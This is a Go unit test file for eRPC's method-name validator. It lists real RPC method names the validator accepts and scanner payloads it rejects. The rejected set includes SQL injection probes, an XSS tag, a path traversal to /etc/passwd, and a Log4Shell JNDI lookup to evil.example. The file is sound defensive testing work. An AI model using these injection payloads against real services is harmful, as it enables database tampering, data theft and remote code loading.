package common

import (
	"strings"
	"testing"

	"github.com/erpc/erpc/util"
	"github.com/stretchr/testify/assert"
)

func init() { util.ConfigureTestLogger() }

// The unknown-method fallthrough is the primary path: eRPC never enumerates
// methods, so the validator must admit every shape a chain or vendor might
// ship, not just the ones in this repo today.
func TestIsValidMethodName_AdmitsRealMethods(t *testing.T) {
	for _, m := range []string{
		// EVM standard + namespaced.
		"eth_call",
		"eth_getBlockByNumber",
		"eth_getTransactionByBlockNumberAndIndex",
		"eth_sendRawTransaction",
		"net_version",
		"web3_clientVersion",
		"debug_traceBlockByNumber",
		"trace_replayBlockTransactions",
		"arbtrace_filter",
		"erigon_getHeaderByNumber",
		"txpool_content",
		"zks_getBridgeContracts",
		"starknet_getBlockWithTxs",
		"bor_getAuthor",
		"ots_getBlockDetails",
		// Vendor-prefixed.
		"alchemy_getTokenBalances",
		"qn_getWalletTokenBalance",
		// eRPC's own admin surface.
		"erpc_cordonUpstream",
		"erpc_listApiKeys",
		// Non-EVM architectures eRPC proxies or may proxy.
		"getAccountInfo",
		"getSignaturesForAddress",
		"sui_getObject",
		"suix_getBalance",
		"broadcast_tx_sync",
		// OpenRPC reserved prefix — the `.` must stay legal.
		"rpc.discover",
		// Hyphen: no chain uses one today, but nothing forbids it either.
		"vendor-ns_someMethod",
		// Digits and mixed case.
		"eth_getProof2",
		"ETH_CALL",
		// Exactly at the length ceiling.
		strings.Repeat("a", MaxMethodNameLength),
	} {
		assert.Truef(t, IsValidMethodName(m), "expected %q to be accepted", m)
	}
}

// Payloads observed on edge.goldsky.com: scanner traffic glues an injection
// probe onto a real method name. Each one was forwarded upstream and became a
// `category` label value.
func TestIsValidMethodName_RejectsScannerPayloads(t *testing.T) {
	for _, m := range []string{
		`eth_call-1 waitfor delay '0:0:15' --`,
		`eth_call0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z`,
		`eth_call0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z`,
		`eth_call0QIdoFZC') OR 157=(SELECT 157 FROM PG_SLEEP(15))--`,
		`eth_call0gKNMqyv' OR 488=(SELECT 488 FROM PG_SLEEP(15))--`,
		`eth_call1EojkuVX' OR 838=(SELECT 838 FROM PG_SLEEP(15))--`,
		`eth_call1F1bKw9S') OR 931=(SELECT 931 FROM PG_SLEEP(15))--`,
		`eth_call1abfiViN'; waitfor delay '0:0:15' --`,
		`<script>alert(1)</script>`,
		`eth_call';DROP TABLE users;--`,
		`${jndi:ldap://evil.example/a}`,
		`../../../../etc/passwd`,
		`eth_call\u0000`,
		"eth_call\x00",
		"eth_call\n",
		"eth_call\t",
		"eth_call ",
		" eth_call",
		"eth/call",
		"eth:call",
		"eth call",
		"eth*",
		"eth_call|eth_getLogs",
		"eth_call%20",
		// Non-ASCII: homoglyph/unicode variants are distinct label values too.
		"eth_cаll", // Cyrillic 'а'
		"日本語",
		"eth_call\u200b",
		// Boundaries.
		"",
		strings.Repeat("a", MaxMethodNameLength+1),
	} {
		assert.Falsef(t, IsValidMethodName(m), "expected %q to be rejected", m)
	}
}
